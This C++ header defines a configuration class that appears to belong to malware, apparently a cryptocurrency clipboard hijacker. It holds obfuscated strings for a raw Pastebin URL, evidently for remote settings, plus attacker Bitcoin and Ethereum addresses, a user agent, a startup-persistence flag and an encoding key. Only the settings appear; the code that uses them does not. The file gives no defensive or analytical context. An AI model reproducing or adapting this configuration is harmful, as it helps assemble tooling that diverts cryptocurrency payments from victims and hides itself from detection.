#pragma once
#include <fstream>
#include "obfuscat.h"
class Config
{
	public:
		std::string pastebinUrl = OBFUSCATE("http://pastebin.com/raw/Yd76WVbu");
		std::string BitcoinAddress = OBFUSCATE("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN3");
		std::string EthereumAddress = OBFUSCATE("0x176B24B4c871Df6e0fE4E0c735Db075064b47Bc4");
		std::string useragent = OBFUSCATE("somesecret");
		bool startup = false;
		char key[3] = { 'K', 'C', 'Q' }; //Any chars will work
};

